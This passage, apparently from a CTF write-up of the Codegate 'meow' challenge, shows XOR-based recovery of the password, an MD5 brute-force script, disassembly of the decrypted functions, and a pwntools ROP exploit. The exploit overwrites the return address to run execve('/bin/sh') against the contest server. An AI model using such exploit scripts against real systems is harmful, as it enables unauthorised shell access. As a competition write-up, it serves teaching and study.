                #print chr(ord(perm[i]) ^ con), a
                c = chr(ord(perm[i]) ^ con)
                if c not in string.printable:
                    return None
                out += c
                break
        else:
            #print '?', a
            out += '?'
    return out
```
This allowed me to show all constraints, or rather answer the question `"what is this byte xored with"`
```
00 ? v2^v5
aa ? v2^v3
48 ? v1^v8
d0 ? v3^v9
b4 ? v0^v3^v5^v9
00 ? v1^v3^v5^v6
00 ? v2^v5^v6^v7
4d ? v0^v3^v7^v8
00 ? v3^v4
5d ? v4^v8
62 ? v2^v3^v5^v9
a1 ? v0^v3^v5^v6
4f O 0
fe ? v8^v9
4e ? v1^v3^v7^v9
29 ? v3^v5
00 ? v4^v5^v7
13 ? v0^v5^v7^v8
89 ? v1^v4^v6^v9
a1 ? v0^v1^v4^v7
00 ? v1^v3^v5^v8
00 ? v2^v5^v6^v9
38 ? v0^v2^v4^v9
5a ? v1^v3^v5^v7
4b ? v2^v4^v6^v9
41 ? v1^v5^v7^v9
b8 ? v1^v8
32 ? v3^v6^v7^v9
2c ? v7^v8
61 a 0
76 ? v2^v5
07 ? v2^v3
25 ? v4^v5^v8^v9
29 ? v1^v5^v9
df ? v3^v9
73 ? v3^v5
69 ? v5^v6
c2 ? v0^v7
07 ? v0^v2^v6
64 ? v1^v3^v7
14 ? v2^v4^v8
bf ? v1^v3^v4^v9
58 ? v0^v1
4b ? v1^v3
3f ? v0^v2^v3^v5
2d ? v1^v7
2d ? v0^v2^v3^v7
bc ? v1^v3^v4^v9
15 ? v2^v3
08 ? v4^v9
2f ? v1^v3^v5^v9
c6 ? v2^v3^v5^v6
5c ? v0^v3^v5^v7
5e ? v0^v1^v4^v5
7d } 0
a2 ? v0^v2^v3^v7
e0 ? v1^v3^v5^v8
49 ? v2^v4^v7^v9
ab ? v5^v6
99 ? v1^v7
6e ? v3^v8
03 ? v1^v3^v4^v9
00 ? v0^v1
00 ? v1^v3
```
First column: value in ciphertext
Second column: plaintext byte, if known (known only if we're xoring with zero, of course)
Third column: password chars we're xoring with (v0 = first char, v1 = second char, etc)
Ok, it's something but not enough. In fact, this was very misleading, because we thought that this second encrypted blob is flag, or at least plaintext (all known bytes are printable)! This turned out not to be the case, and I wasted a lot of time, unfortunatelly.
But to the point, I think word of explaination is due (i skipped a lot of things). What does this even do:
```python
def make_sympad(syms):
    passw = [SymbolicXor('v'+str(i)) for i in range(16)]
    pad = map(ord, '\0' * syms)
    decrypt(pad, passw)
    return pad
def permute(data):
    perm = map(ord, data)
    decrypt(perm, [0]*16)
    return ''.join(map(chr, perm))
def transform(data, maps):
    # pad - encrypted and permutted zeroes - so plain 'one time pad' generated from password
    pad = make_sympad(len(data))
    # perm - permutation of encrypted data, so they are in original order
    perm = permute(data)
```
So, I knew that everything is just xoring - so in theory if I'll encrypt zeroes, I'll know exactly what gets xored with what (because of SymbolicXor class). But there is small problem, order of characters in ciphertext is permuted, so I had to create `permute` function that reverses that permutation (I know, not the best name).
Going back to our ciphertexts - I discovered that if we decrypt both ciphertexts, they both have the same start and similar end. And because we know that first ciphertext is code, that means that second CT must be too.
What can we do with this knowledge? A lot!. 
We assumed most standard prologue and epilogue, and came out with something like this (excuse non-standard notation) - for fragments that was the same in both ciphertexts:
```
    ((0x55 ^ 0x0d), SymbolicXor(['v5', 'v2'])),  # push rbp
    ((0x48 ^ 0x48), SymbolicXor(['v2', 'v3'])),  # mov rbp, rsp
    ((0x89 ^ 0xf5), SymbolicXor(['v1', 'v8'])),  
    ((0xe5 ^ 0xaf), SymbolicXor(['v3', 'v9'])),
    ((0x48 ^ 0x4d), SymbolicXor(['v0', 'v3', 'v5', 'v9'])),  # lea rdi [stuff]
    ((0xa7 ^ 0xC3), SymbolicXor(['v1', 'v3'])), # ret at the end
```
This list means for example that `v5 ^ v2 == 0x55 ^ 0x0d`. So what? Well, by itself it's useless, but remember that we know md5 of whole password! So now we can intelligently bruteforce everything:
```python
import hashlib
import string
charset = string.printable
sought = '9F46A92422658F61A80DDEE78E7DB914'.decode('hex')
for o1 in map(ord, charset):
    o3 = o1 ^ (0xa7 ^ 0xc3)
    o8 = o1 ^ (0x89 ^ 0xf5)
    o2 = o3 ^ (0x48 ^ 0x48)
    o5 = o2 ^ (0x55 ^ 0x0d)
    o9 = o3 ^ (0xe5 ^ 0xaf)
    o0 = o3 ^ o5 ^ o9 ^ (0x48 ^ 0x4d)
    v0 = chr(o0)
    v1 = chr(o1)
    v2 = chr(o2)
    v3 = chr(o3)
    v5 = chr(o5)
    v8 = chr(o8)
    v9 = chr(o9)
    for v4 in charset:
        for v6 in charset:
            for v7 in charset:
                passw = v0 + v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9
                if hashlib.md5(passw).digest() == sought:
                    print passw
```
And... it worked!
```
$ ./brute
$W337k!++y
```
Awesome, let's use it and get the flag:
```
╰─$ ./meow.exe
***** hello? *****
>>> $W337k!++y
- What kind of pet would you like to have?
- Select the number of pet!
1. angelfish
2. bear
3. cat
4. dog
5. I don't want pets
# number = 3
Did you choose a cat?????
What type of cat would you prefer? '0'
>>>0
fish: “./meow.exe” terminated by signal SIGSEGV (Address boundary error)
```
Wait, what? WTF codegate, where is my flag? Let's reverse what happened. This is decrypted function that gets called:
```asm
sub_7FFF3A41CC70 proc near
var_60= qword ptr -60h
var_58= qword ptr -58h
var_50= qword ptr -50h
var_48= qword ptr -48h
var_40= qword ptr -40h
var_38= qword ptr -38h
var_30= qword ptr -30h
var_28= qword ptr -28h
var_20= dword ptr -20h
var_1C= byte ptr -1Ch
push    rbp
mov     rbp, rsp
sub     rsp, 60h
mov     rax, 20756F7920646944h
mov     [rbp+var_60], rax
mov     rax, 612065736F6F6863h
mov     [rbp+var_58], rax
mov     rax, 3F3F3F3F74616320h
mov     [rbp+var_50], rax
mov     rax, 7420746168570A3Fh
mov     [rbp+var_48], rax
mov     rax, 6320666F20657079h
mov     [rbp+var_40], rax
mov     rax, 646C756F77207461h
mov     [rbp+var_38], rax
mov     rax, 65727020756F7920h
mov     [rbp+var_30], rax
mov     rax, 273027203F726566h
mov     [rbp+var_28], rax
mov     [rbp+var_20], 3E3E3E0Ah
mov     [rbp+var_1C], 0
lea     rax, [rbp+var_60]
mov     edx, 44h
mov     rsi, rax
mov     edi, 1
mov     eax, 1
syscall
lea     rax, [rbp+8]
mov     edx, 18h
mov     rsi, rax
mov     edi, 0
mov     eax, 0
syscall
nop
leave
retn
sub_7FFF3A41CC70 endp
```
See it yet? Yes, this code reads 18 bytes **on the stack, overwriting the return address**. Yeah, we're in pwn challenge now.
But this won't stop us. Fortunatelly, exploit turned out to be easier than I thought, because second ciphertext was clearly meant to help us:
```asm
sub_7FFF3A41CC30 proc near
var_8= qword ptr -8
push    rbp
mov     rbp, rsp
sub     rsp, 10h
mov     [rbp+var_8], rdi
mov     rax, [rbp+var_8]
mov     edx, 0
mov     esi, 0
mov     rdi, rax
mov     eax, 3Bh
syscall
nop
leave
retn
sub_7FFF3A41CC30 endp
; ---------------------------------------------------------------------------
db    0
db    0
aBinSh db '/bin/sh',0
db    0
db    0
db    0
db    0
db    0
; =============== S U B R O U T I N E =======================================
sub_7FFF3A41CC66 proc near
pop     rdi
retn
```
Additionally this code was loaded at constant offset in memory, so this should be easy as PWN 100 in High-School CTF.
Our ROP chain will look like this:
```
[pop rdi gadget]
"/bin/sh"
[shellcode]
```
So we'll pop "/bin/sh" to edi, and execute execve systall with it.
Easy enough wth pwnlib!
```python
from pwn import *
r = remote('110.10.212.139', 50410)
print r.recv()
r.send('$W337k!++y\n')
print r.recv()
print r.recv()
r.send('3\n')
print r.recv()
import struct
ra = struct.pack('<Q', 0x14000)
gadget = struct.pack('<Q', 0x014036)
shell = struct.pack('<Q', 0x14029)
cat = gadget + shell + ra
print cat.encode('hex')
r.send(cat)
r.interactive()
```
Annd... It worked, and gave us flag (finally!):
```
$ cat fflag
flag{what a lovely kitty!}
```